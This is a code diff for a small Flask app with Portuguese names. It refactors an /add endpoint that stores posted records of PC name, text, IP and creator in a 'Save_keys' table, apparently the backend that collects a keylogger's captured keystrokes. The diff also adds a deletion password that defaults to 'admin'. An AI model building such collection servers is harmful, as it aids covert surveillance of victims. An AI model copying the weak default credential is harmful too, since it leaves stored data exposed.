@@ -7,7 +7,7 @@ from datetime import datetime
 from app.models.tables import Save_keys
 from app.models.forms import Delet_form
 from app.controllers.respostas import resposta_cod_add
-from app.controllers.texte_manager import limitar_texto
+from app.controllers.texte_manager import limitar_texto, verificar_arg_secundarios_dict
 
 
 @app.route('/')
@@ -66,6 +66,7 @@ def teclas_salvas(pg=1):
 def download():
     return render_template('download.html')
 
+
 @app.route('/add', methods=['POST'])
 def add():
     body = request.get_json()
@@ -73,18 +74,11 @@ def add():
         if p not in body:
             return resposta_cod_add(cod=400, msg=f'O parametro [{p}] é obrigatorio! ')
     
-    if 'criador' not in body:   
-        body['criador'] = 'Anonymo'
-    elif body['criador'] == '': 
-        body['criador'] = 'Anonymo'
-        
-    
-    if 'ip' not in body:
-        body['ip'] = None
-    elif body['ip'] == '': 
-        body['ip'] = None
-    
-    me = Save_keys(pcname=body['pcname'], texto=body['texto'], data=datetime.now(), criador=body['criador'], ip=body['ip'])
+    body = verificar_arg_secundarios_dict(body=body, arg='criador', padrao='Anonymo')
+    body = verificar_arg_secundarios_dict(body=body, arg='ip', padrao=None)
+    body = verificar_arg_secundarios_dict(body=body, arg='senha_delete', padrao='admin')
+
+    me = Save_keys(pcname=body['pcname'], texto=body['texto'], data=datetime.now(), criador=body['criador'], ip=body['ip'], senha_delete=body['senha_delete'])
     db.session.add(me)
     db.session.commit()
 
